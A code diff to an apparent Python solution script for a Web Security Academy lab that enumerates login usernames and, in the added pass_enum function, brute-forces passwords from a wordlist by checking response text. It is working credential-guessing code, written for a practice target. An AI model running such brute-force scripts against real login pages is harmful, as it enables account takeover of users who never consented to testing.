@@ -4,10 +4,10 @@ from ratelimit import limits, RateLimitException, sleep_and_retry
 
 ONE_MINUTE = 60
 MAX_CALLS_PER_MINUTE = 120
-url = 'https://0a5700cb04b21ea8c0da5f02009600ed.web-security-academy.net/login'
+url = 'https://0a3e001f0401142ec02f7db9002000b7.web-security-academy.net/login'
 headers = {
     'Content-Type': 'application/x-www-form-urlencoded',
-    'Referer': 'https://0a5700cb04b21ea8c0da5f02009600ed.web-security-academy.net/login',
+    'Referer': 'https://0a3e001f0401142ec02f7db9002000b7.web-security-academy.net/',
 
 }
 cookies = {
@@ -32,18 +32,23 @@ def user_enum(url, user_file_list, headers, cookies):
             if 'Invalid username' not in res.text:
                 return line
 
-def pass_enum():
-    pass
+def pass_enum(url, username, pass_file_list, headers, cookies):
+    with Path(pass_file_list).open('r') as file:
+        lines = file.readlines()
+        for line in lines:
+            res = make_pass_call(url, username, line.strip(), headers, cookies)
+            if 'Incorrect password' not in res.text:
+                return line
 
 def main():
-    print(
-        user_enum(
+    user = user_enum(
             url,
             './usernames.txt',
             headers,
             cookies
-        )
-    )    
+    )
+
+
 
 if __name__ == "__main__":
     main()
